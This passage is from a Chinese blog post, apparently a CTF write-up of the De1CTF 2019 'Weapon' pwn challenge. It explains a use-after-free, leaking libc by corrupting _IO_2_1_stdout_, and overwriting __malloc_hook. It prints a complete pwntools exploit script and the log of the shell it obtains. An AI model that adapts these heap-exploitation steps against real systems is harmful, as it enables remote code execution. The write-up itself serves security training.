+<h3 id="Weapon-De1CTF-2019"><a href="#Weapon-De1CTF-2019" class="headerlink" title="Weapon(De1CTF 2019)"></a>Weapon(De1CTF 2019)</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在<code>delete</code>函数中存在<code>UAF</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">free_</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input idx :"</span>, a2);</span><br><span class="line">  v3 = input_();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> &amp;&amp; v3 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_202060 + <span class="number">2</span> * v3));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
+<li>double free使得heap可控</li>
+<li>利用unsorted bin留下的脚印爆破stdout，改stdout泄露地址</li>
+<li>劫持hook</li>
+</ul>
+<h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><p>同样也是利用<code>_IO_2_1_stdout_</code>来泄露信息,这里是通过在附近找一个地址可以伪造<code>size</code>,通过<code>double free</code>或者<code>malloc consolidate</code>触发 </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x7ffff7dd25dd</span></span><br><span class="line"><span class="number">0x7ffff7dd25dd</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">157</span>&gt;:	<span class="number">0xfff7dd1660000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd25ed</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">173</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd25fd</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">189</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd260d</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">205</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0xfff7dd06e0000000</span></span><br><span class="line"><span class="number">0x7ffff7dd261d</span> &lt;_IO_2_1_stderr<span class="number">_</span>+<span class="number">221</span>&gt;:	<span class="number">0x00fbad288700007f</span>	<span class="number">0xfff7dd26a3000000</span></span><br></pre></td></tr></table></figure>
+
+<p>修改前: </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p /x _IO_2_1_stdout<span class="number">_</span></span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2887</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7ffff7dd26a4</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7ffff7dd18e0</span>, </span><br><span class="line">    _fileno = <span class="number">0x1</span>, </span><br><span class="line">    _flags2 = <span class="number">0x0</span>, </span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _cur_column = <span class="number">0x0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>, </span><br><span class="line">    _shortbuf = &#123;<span class="number">0xa</span>&#125;, </span><br><span class="line">    _lock = <span class="number">0x7ffff7dd3780</span>, </span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dd17a0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0x0</span>, </span><br><span class="line">    _mode = <span class="number">0xffffffff</span>, </span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x7ffff7dd25dd</span> (_IO_2_1_stderr<span class="number">_</span>+<span class="number">157</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="symbol">all:</span> <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<p>修改后:  </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p /x _IO_2_1_stdout<span class="number">_</span></span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad1800</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7ffff7dd2600</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7ffff7dd26a3</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7ffff7dd26a4</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7ffff7dd18e0</span>, </span><br><span class="line">    _fileno = <span class="number">0x1</span>, </span><br><span class="line">    _flags2 = <span class="number">0x0</span>, </span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _cur_column = <span class="number">0x0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>, </span><br><span class="line">    _shortbuf = &#123;<span class="number">0xa</span>&#125;, </span><br><span class="line">    _lock = <span class="number">0x7ffff7dd3780</span>, </span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dd17a0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0x0</span>, </span><br><span class="line">    _mode = <span class="number">0xffffffff</span>, </span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="完整脚本-1"><a href="#完整脚本-1" class="headerlink" title="完整脚本"></a>完整脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">host, port = <span class="string">"192.168.37.140"</span>, <span class="string">"9999"</span></span><br><span class="line">filename = <span class="string">"./pwn"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(p)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    <span class="comment">#script += "b * 0x%x\n"%(LIBC+)</span></span><br><span class="line">    gdb.attach(p,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(idx,size,name=<span class="string">"padding"</span>)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">":\n"</span>,name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">":\n"</span>,name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx,size,name=<span class="string">"padding"</span>)</span>:</span></span><br><span class="line">	Cmd(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">":"</span>,name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	Cmd(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">p=getConn()</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">"a"</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">"b"</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>*<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">"\xdd\x25"</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">"e"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"\x00"</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">"f"</span>)</span><br><span class="line">create(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"f"</span>)</span><br><span class="line">file_struct = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x00"</span></span><br><span class="line">create(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+file_struct)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">'leak=%s'</span>% hex(leak))</span><br><span class="line">libc_addr=leak<span class="number">-0x3c5600</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_addr =  u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))-libc.symbols["_IO_2_1_stdout_"]-131</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">Add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">Add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">Add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">Free(<span class="number">0</span>)</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Free(<span class="number">0</span>)</span><br><span class="line">fake=libc_addr+libc.sym[<span class="string">"__malloc_hook"</span>]<span class="number">-0x23</span></span><br><span class="line"></span><br><span class="line">Add(<span class="number">1</span>,<span class="number">0x60</span>,p64(fake))</span><br><span class="line">Add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">"t"</span>)</span><br><span class="line">debug([<span class="number">0xa50</span>])</span><br><span class="line">Add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_addr+<span class="number">0xf1147</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"weapon: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x60</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="string">'wlecome input your size of weapon: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="symbol">bytes:</span></span><br><span class="line">    <span class="string">'96\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0xd</span> <span class="symbol">bytes:</span></span><br><span class="line">    <span class="string">'input index: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="symbol">bytes:</span></span><br><span class="line">    <span class="string">'6\n'</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> <span class="symbol">bytes:</span></span><br><span class="line">    <span class="string">'whoami\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="symbol">bytes:</span></span><br><span class="line">    <span class="string">'jcxp\n'</span></span><br><span class="line">jcxp</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/09/11/护网杯-flower-Writeup/" title= "护网杯 flower Writeup">
+                    <div class="prevTitle">护网杯 flower Writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:jiancanxuepiao@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/jcxp" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FILE-介绍"><span class="toc-number">2.</span> <span class="toc-text">FILE 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用过程"><span class="toc-number">3.</span> <span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">4.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Warmup-Nu1lctf2019"><span class="toc-number">4.1.</span> <span class="toc-text">Warmup(Nu1lctf2019)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#思路"><span class="toc-number">4.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞点"><span class="toc-number">4.1.2.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#具体利用"><span class="toc-number">4.1.3.</span> <span class="toc-text">具体利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#比赛环境"><span class="toc-number">4.1.4.</span> <span class="toc-text">比赛环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#完整脚本"><span class="toc-number">4.1.5.</span> <span class="toc-text">完整脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell"><span class="toc-number">4.1.6.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weapon-De1CTF-2019"><span class="toc-number">4.2.</span> <span class="toc-text">Weapon(De1CTF 2019)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">4.2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用思路"><span class="toc-number">4.2.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用流程"><span class="toc-number">4.2.3.</span> <span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#完整脚本-1"><span class="toc-number">4.2.4.</span> <span class="toc-text">完整脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell-1"><span class="toc-number">4.2.5.</span> <span class="toc-text">getshell</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/利用-IO-2-1-stdout-泄露信息/" >利用_IO_2_1_stdout_泄露信息</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/护网杯-flower-Writeup/" >护网杯 flower Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
